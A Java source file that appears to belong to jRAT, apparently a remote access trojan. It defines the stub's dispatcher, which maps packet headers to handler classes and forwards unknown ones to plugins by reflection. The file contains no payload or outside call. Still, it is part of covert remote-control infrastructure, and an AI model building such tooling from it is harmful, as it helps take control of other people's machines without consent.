package jrat.client.packets.incoming;

import jrat.common.PacketRange;
import jrat.client.Connection;
import jrat.client.Plugin;

import java.util.HashMap;
import java.util.Set;


public abstract class AbstractIncomingPacket {


	public static final void execute(Connection con, short header) {
		try {
			AbstractIncomingPacket packet = null;
			Set<Short> set = IncomingPackets.PACKETS_INCOMING.keySet();
			for (short s : set) {
				if (s == header) {
					packet = IncomingPackets.PACKETS_INCOMING.get(s).newInstance();
					break;
				}
			}
			
			if (packet != null && header >= 0 && header <= PacketRange.RANGE_STUB_INCOMING) {
				packet.read(con);
			} else {
				for (Plugin p : Plugin.list) {
					p.methods.get("onpacket").invoke(p.instance, header);
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public abstract void read(Connection con) throws Exception;

}
